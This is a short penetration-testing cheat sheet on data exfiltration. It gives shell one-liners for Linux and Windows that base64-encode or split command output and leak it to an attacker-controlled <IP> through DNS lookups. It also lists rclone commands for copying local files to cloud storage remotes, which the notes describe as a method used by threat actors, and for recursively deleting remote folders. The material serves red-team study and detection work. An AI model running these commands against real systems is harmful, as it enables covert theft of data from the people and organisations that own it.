# General - Data exfiltration

The following note details the technics and tools that can be used to
exfiltrate data through an indirect channel.

### DNS exfiltration

###### Limited exfiltration using built-in utilities

DNS queries can be used to exfiltrate data through the requested domain name.

```
# Listener
tcpdump -i <INTERFACE> udp port 53
# Every Responder's servers can be turned off in Responder.conf, except for the DNS service
responder -i <INTERFACE>

# Linux
<COMMAND> | while read data; do datab64=`echo $data | base64 -w 0`; host $datab64.ex.data <IP>; done

# Windows
nslookup <%VARIABLE%> <IP>
# The DOS for loop only output the number of columns specified by the tokens parameter. 1 = %a, 2 = %b, etc.
for /f "tokens=1,2,3" %a in ('<COMMAND>') do nslookup %a.%b.%c <IP>

cmd.exe /c "for /f ""tokens=1,2,3"" %a in ('<COMMAND>') do nslookup %a.%b.%c <IP>"
```

### rclone

`rclone` is a command line utility written in `Go` to download  / upload files
and directories to and from over 40 cloud storage providers. In addition to
more classical file upload services (`FTP`, `SFTP` / `FTPS`, `Webdav`, etc.),
`rclone` supports a number of cloud services: `MEGA`, `Google Drive`,
`Microsoft OneDrive`, `Amazon S3 buckets`, `Azure Blob Storage`, etc.).  

`rclone` provides cloud equivalents to the `unix` common commands `cat`, `ls`,
`mkdir`, `cp`, `mv`, `mount`, etc. commands. It supports multi-retries and
verifies file operations using checksums.

It is notably used by some threats actors to exfiltrate files to online file
storage and cloud provider with out raising suspicion.

```bash
# Lists the supported services.
rclone help backends

# Configures a remote through an interactive configuration prompt.
rclone config

# Lists all the configured remotes.
rclone listremotes

# Displays information of the configured remotes (by printing the decrypted config file).  
rclone config show

# Files operation to respectively list files, create a (product-specific) folder, print / upload / download / delete a file.
rclone ls <REMOTE_NAME>:
rclone tree <REMOTE_NAME>:
rclone mkdir <REMOTE_NAME>:<FOLDER_NAME>
rclone cat <REMOTE_NAME>:<FILE_PATH>
rclone copy <LOCAL_FILE> <REMOTE_NAME>:<FILE_PATH>
rclone copy <REMOTE_NAME>:<FILE_PATH> .
rclone deletefile <REMOTE_NAME>:<FILE_PATH>
# Recursively delete all files in the specified remote / (product-specific) folder.
rclone delete <REMOTE_NAME>:
rclone delete <REMOTE_NAME>:/<FOLDER>/

# Mount the specified remote as a local filesystem mountpoint (blocking execution).
rclone mount <REMOTE_NAME>: <LOCAL_MOUNTPOINT_PATH>

# Example to configure a Microsoft Azure blob remote, copy a local file to the remote and validate the copy by listing and printing the created file.
rclone config create <REMOTE_NAME> azureblob account <STORAGE_ACCOUNT_NAME> key <STORAGE_ACCOUNT_KEY>
rclone copy <LOCAL_FILE> <REMOTE_NAME>:/<STORAGE_ACCOUNT_CONTAINER>/
rclone ls <REMOTE_NAME>:
rclone cat <REMOTE_NAME>:/<STORAGE_ACCOUNT_CONTAINER>/<FILE_NAME>
```
